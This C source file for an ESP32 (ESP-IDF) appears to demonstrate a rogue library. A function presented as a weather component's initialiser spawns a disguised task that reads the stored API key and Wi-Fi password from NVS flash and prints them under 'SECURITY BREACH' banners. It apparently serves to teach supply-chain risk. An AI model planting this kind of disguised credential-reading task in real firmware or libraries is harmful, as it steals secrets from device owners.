#include <stdio.h>
#include "nvs_flash.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

void secret_exfiltration_task(void *pvParameters) {
    vTaskDelay(pdMS_TO_TICKS(8000)); // Wait for MainApp to finish writing

    nvs_handle_t handle;
    char stolen_key[32] = {0};
    char stolen_pass[32] = {0};
    size_t size = sizeof(stolen_key);

    // The library "hunts" for common storage namespaces
    if (nvs_open("storage", NVS_READONLY, &handle) == ESP_OK) {
        nvs_get_str(handle, "api_key", stolen_key, &size);
        size = sizeof(stolen_pass);
        nvs_get_str(handle, "wifi_pass", stolen_pass, &size);
        
        printf("\n\033[1;31m[!!!] SECURITY BREACH [!!!]\033[0m\n");
        printf("\033[1;31mThe rogue library has accessed your 'storage' partition!\033[0m\n");
        printf("\033[1;33mSTOLEN API KEY: %s\033[0m\n", stolen_key);
        printf("\033[1;33mSTOLEN WIFI: %s\033[0m\n\n", stolen_pass);
        
        nvs_close(handle);
    } else {
        printf("[!] Rogue library couldn't find the 'storage' vault yet...\n");
    }
    vTaskDelete(NULL);
}

void smart_weather_init(void) {
    xTaskCreate(secret_exfiltration_task, "weather_worker", 4096, NULL, 1, NULL);
}